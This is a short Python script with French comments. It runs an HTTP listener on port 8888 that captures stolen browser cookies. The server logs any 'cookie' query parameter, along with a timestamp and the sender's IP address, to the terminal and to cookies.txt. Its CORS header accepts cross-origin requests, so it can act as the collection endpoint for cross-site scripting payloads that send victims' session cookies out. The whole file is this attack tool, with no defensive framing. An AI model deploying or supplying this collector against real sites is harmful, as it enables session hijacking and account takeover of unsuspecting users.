#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
import datetime

# Handler pour traiter les requetes HTTP
class Handler(BaseHTTPRequestHandler):
    # Desactive les logs HTTP par defaut
    def log_message(self, format, *args):
        pass
    
    # Traite les requetes GET
    def do_GET(self):
        # Parse l'URL et extrait les parametres
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        
        # Si le parametre 'cookie' existe, on l'affiche et sauvegarde
        if 'cookie' in params:
            cookie = params['cookie'][0]
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Affiche dans le terminal
            print(f"\n[{timestamp}] Cookie received from {self.client_address[0]}")
            print(cookie)
            print()
            
            # Sauvegarde dans un fichier
            with open('cookies.txt', 'a') as f:
                f.write(f"[{timestamp}] {cookie}\n")
        
        # Repond 200 OK au client
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.send_header('Access-Control-Allow-Origin', '*')  # Permet les requetes cross-origin
        self.end_headers()
        self.wfile.write(b'ok')

def main():
    port = 8888
    # Ecoute sur toutes les interfaces (0.0.0.0)
    server = HTTPServer(('', port), Handler)
    print(f"Server running on port {port}")
    print("Waiting for requests...\n")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nServer stopped")
        server.server_close()

if __name__ == "__main__":
    main()